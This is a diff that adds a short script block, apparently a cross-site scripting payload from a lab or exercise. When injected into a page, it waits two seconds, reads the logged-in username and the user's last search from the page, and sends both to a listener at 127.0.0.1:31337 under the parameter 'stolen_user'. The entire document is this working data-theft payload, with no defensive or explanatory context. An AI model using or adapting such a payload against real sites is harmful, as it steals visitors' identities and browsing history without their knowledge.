@@ -1,0 +1,8 @@
+<script>
+	var username = $('#logged-in-user').text();
+	setTimeout(() => {
+	var history = document.getElementsByClassName('history-item');
+	var last_search = history[1].innerHTML;
+	$.get('http://127.0.0.1:31337/?stolen_user='+username+'&last_search='+last_search);
+	},2000);
+</script>
